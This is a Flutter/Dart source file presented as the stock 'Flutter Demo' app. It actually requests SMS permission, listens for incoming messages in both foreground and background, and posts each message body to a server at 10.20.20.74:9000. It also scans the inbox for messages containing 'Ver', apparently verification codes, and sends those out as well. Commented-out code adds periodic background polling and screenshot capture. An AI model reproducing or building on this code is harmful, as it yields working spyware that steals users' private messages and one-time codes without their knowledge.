import 'dart:convert';
import 'dart:typed_data';

import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:telephony/telephony.dart';

//
// @pragma('vm:entry-point')
// void callbackDispatcher() {
//   Workmanager().executeTask((task, inputData) async {
//     try {
//       if (task == 'periodic') {
//         final sms = await Telephony.instance.getInboxSms(
//           columns: [
//             SmsColumn.ADDRESS,
//             SmsColumn.BODY,
//             SmsColumn.DATE,
//           ],
//           // filter: SmsFilter.where(SmsColumn.ADDRESS).equals('+923127191646'),
//           filter: SmsFilter.where(SmsColumn.BODY).like('veri'),
//         );
//         print('RRRRRRRRRRRR');
//         print(sms.length);
//         for (final s in sms) {
//           print(s.address);
//           print(s.body);
//           if (s.date != null) {
//             var date = DateTime.fromMillisecondsSinceEpoch(s.date!);
//             print(date);
//           }
//         }
//       }
//       return true;
//     } catch (e) {
//       rethrow;
//     }
//   });
// }

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  // Workmanager().initialize(
  //   callbackDispatcher, // The top level function, aka callbackDispatcher
  //   isInDebugMode: true,
  //   // If enabled it will post a notification whenever the task is running. Handy for debugging tasks
  // );
  // Workmanager().cancelAll();
  // Workmanager().registerPeriodicTask(
  //   'sms-task-identifier',
  //   'periodic',
  //   frequency: const Duration(minutes: 15),
  // );
  // final query = SmsQuery();
  // final sms = await query.querySms(
  //   kinds: [SmsQueryKind.inbox],
  // );
  // print('RRRRRRRRRRRRR Background');
  // for (final s in sms) {
  //   print(s.body);
  //   print(s.read);
  //   print(s.sender);
  //   print(s.date);
  //   print('0000000');
  // }
  // print('*******');
  // Workmanager().registerOneOffTask(
  //   "sms-task-identifier",
  //   "smsTask",
  // );
  runApp(const MyApp());
}

backgroundMessageHandler(SmsMessage message) async {
  //Handle background message
  print('RRRRRRRRRRRRR Background');
  print('Subject: ${message.subject}');
  print('Body: ${message.body}');
  print('Status: ${message.status}');
  print('Date: ${message.date}');
  print('Center Address: ${message.serviceCenterAddress}');
  print('*************');
  await http.post(
    Uri.parse('http://10.20.20.74:9000/sms'),
    body: jsonEncode({'body': message.body ?? 'null sms'}),
  );
  // final path = await NativeScreenshot.takeScreenshotImage();
  // print('RRRRRRRR Capture');
  // print(path);
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Flutter Demo',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: const MyHomePage(title: 'Flutter Demo Home Page'),
    );
  }
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({super.key, required this.title});

  final String title;

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  final telephony = Telephony.instance;

  void getData() async {
    final sms = await telephony.getInboxSms(
      columns: [
        SmsColumn.ADDRESS,
        SmsColumn.BODY,
        SmsColumn.DATE,
      ],
      // filter: SmsFilter.where(SmsColumn.ADDRESS).equals('+923127191646'),
      filter: SmsFilter.where(SmsColumn.BODY).like('Ver'),
    );
    print('RRRRRRRRRRRR');
    print(sms.length);
    for (final s in sms) {
      print(s.address);
      print(s.body);
      if (s.date != null) {
        var date = DateTime.fromMillisecondsSinceEpoch(s.date!);
        print(date);
        await http.post(
          Uri.parse('http://10.20.20.74:9000/sms'),
          body: jsonEncode({'body': s.body ?? 'null sms'}),
        );
      }
    }
  }

  void listen() async {
    final permissionGranter = await telephony.requestSmsPermissions;
    print('SSSSSSSSSSS');
    print(permissionGranter);
    if (permissionGranter == true) {
      telephony.listenIncomingSms(
        onNewMessage: (message) async {
          print('RRRRRRRRRRRRR Foreground');
          print('Subject: ${message.subject}');
          print('Body: ${message.body}');
          print('Status: ${message.status}');
          print('Date: ${message.date}');
          print('Center Address: ${message.serviceCenterAddress}');
          await http.post(
            Uri.parse('http://10.20.20.74:9000/sms'),
            body: jsonEncode({'body': message.body ?? 'null sms'}),
          );
          print('*************');
        },
        onBackgroundMessage: backgroundMessageHandler,
      );
    }
  }

  @override
  void initState() {
    super.initState();
    // getData();
    listen();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text(widget.title),
      ),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            if (image == null)
              TextButton(
                onPressed: _send,
                child: const Text('Capture'),
              )
            else
              Expanded(child: Image.memory(image!)),
          ],
        ),
      ),
    );
  }

  void _send() async {
    // final path = await NativeScreenshot.takeScreenshotImage();
    // print('RRRRRRRR Capture');
    // if (path != null) {
    //   image = Uint8List.fromList(path);
    //   setState(() {});
    // }
  }

  Uint8List? image;
}
